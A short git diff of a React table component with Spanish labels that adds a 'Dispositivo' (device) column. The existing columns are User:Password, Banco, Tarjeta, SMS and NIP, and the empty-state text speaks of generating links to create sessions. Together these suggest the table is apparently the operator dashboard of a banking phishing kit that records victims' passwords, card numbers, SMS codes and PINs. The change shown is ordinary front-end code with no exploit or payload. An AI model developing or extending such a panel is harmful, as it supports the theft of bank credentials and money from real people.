@@ -531,6 +531,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left">Folio</th>
                 <th className="p-3 text-left">User:Password</th>
                 <th className="p-3 text-left">Banco</th>
+                <th className="p-3 text-left">Dispositivo</th>
                 <th className="p-3 text-left">Tarjeta</th>
                 <th className="p-3 text-left">SMS</th>
                 <th className="p-3 text-left">NIP</th>
@@ -545,7 +546,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
             <tbody>
               {filteredSessions.length === 0 && (
                 <tr>
-                  <td colSpan={13} className="p-4 text-center text-gray-400">
+                  <td colSpan={14} className="p-4 text-center text-gray-400">
                     No hay sesiones activas. Genere un nuevo link para crear una sesión.
                   </td>
                 </tr>
